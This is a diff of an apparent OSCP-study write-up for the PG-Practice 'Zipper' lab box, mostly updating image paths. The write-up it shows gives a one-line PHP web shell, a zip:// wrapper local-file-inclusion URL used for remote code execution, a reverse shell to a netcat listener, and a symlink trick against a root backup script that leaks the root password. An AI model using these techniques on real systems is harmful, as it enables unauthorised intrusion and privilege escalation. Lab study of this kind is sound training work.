@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-19
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Hard
@@ -54,59 +55,59 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 No enumeration conducted
 ## Port 80 - HTTP (Apache 2.4.41)
 - Navigated to `http://192.168.111.229:80` and identified online zip archiver `Zipper`
-![[Pasted image 20241019093604.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019093604.png]]
 - Ran `gobuster dir -u http://192.168.111.229 -w //usr/share/dirb/wordlists/big.txt` to identify web directories
-![[Pasted image 20241019094203.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019094203.png]]
 - Ran `gobuster dir -u http://192.168.111.229 -w //usr/share/dirb/wordlists/big.txt -x php,html,txt` to identify PHP, TXT & HTML files
-![[Pasted image 20241019113329.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019113329.png]]
 
 ---
 # Exploitation
 ## Lcoal File Inclusion
 - Created `simple_cmd.php` to include PHP command `<?php system($_REQUEST["cmd"]); ?>`
-![[Pasted image 20241019114213.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019114213.png]]
 - Uploaded `simple_cmd.php` to Zipper and identified zip file save to `http://192.168.111.229/uploads/upload_1729300477.zip`
-![[Pasted image 20241019114703.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019114703.png]]
 - Navigated to `192.168.111.229/index.php?file=zip://uploads/upload_1729300477.zip%23simple_cmd&cmd=whoami` to obtain RCE via zip wrapper LFI.
-![[Pasted image 20241019114951.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019114951.png]]
 - Uploaded `reverseshell.php` with embedded PHP reverse shell, and identified file uploaded to `http://192.168.111.229/uploads/upload_1729314505.zip`
-![[Pasted image 20241019154026.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019154026.png]]
 - Started netcat listener on port `1234` and navigated to `http://192.168.111.229/index.php?file=zip://uploads/upload_1729314505.zip%23reverseshell` to obtain reverse shell
-![[Pasted image 20241019153949.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019153949.png]]
 
 ---
 # Privilege Escalation
 ## Local Enumeration
 - Ran `find / -name local.txt -type f 2>/dev/null` then ran `cat /var/www/local.txt` to print flag `7638c3497498d0b4f3f12eabd89f3269`
-![[Pasted image 20241019154220.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019154220.png]]
 - Ran `cat /etc/passwd` to identify any other users
-![[Pasted image 20241019154401.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019154401.png]]
 - Ran `sudo -l` to identify `sudo` privileges - password required
-![[Pasted image 20241019154453.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019154453.png]]
 - Ran `crontab -l` to identify any crontab data - none found
-![[Pasted image 20241019154626.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019154626.png]]
 - Ran `ls /var/mail` to check available mail - none found
-![[Pasted image 20241019154731.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019154731.png]]
 - Navigated to `/var/www/html/uploads` & ran `ls -lah` - identified interesting file `enox.zip --> /root/secret`
-![[Pasted image 20241019160605.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019160605.png]]
 - Uploaded `pspy32` and ran `timeout 2m ./pspy32` to identify any processes or scripts running
-![[Pasted image 20241019160635.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019160635.png]]
 - Identified script `/opt/backup.sh` running as `root`
-![[Pasted image 20241019160813.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019160813.png]]
 - Ran `cat /opt/backup.sh` to identify
 ```
 password=`cat /root/secret`
 ```
-![[Pasted image 20241019161447.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019161447.png]]
 ## Privilege Escalation vector
 - Ran `touch root.txt` to create file in `/var/www/html/uplaods` and ran `ln -s /root/secret root.txt` to link file to `/root/secret`
-![[Pasted image 20241019161918.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019161918.png]]
 - Waited for script to run, then ran `cat /opt/backups/backup.log` to view `/root/secret` appended to log file, and identified credentials `WildCardsGoingWild`
-![[Pasted image 20241019162242.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019162242.png]]
 - Ran `su` to switch to `root` and entered credential `WildCardsGoingWild` for password
-![[Pasted image 20241019162340.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019162340.png]]
 - Ran `cat /root/proof.txt` to print flag `a1c4888b41fc7697e214d03584c54dd5`
-![[Pasted image 20241019162623.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241019162623.png]]
 ---
 # Trophy & Loot
 `local.txt` = `7638c3497498d0b4f3f12eabd89f3269`
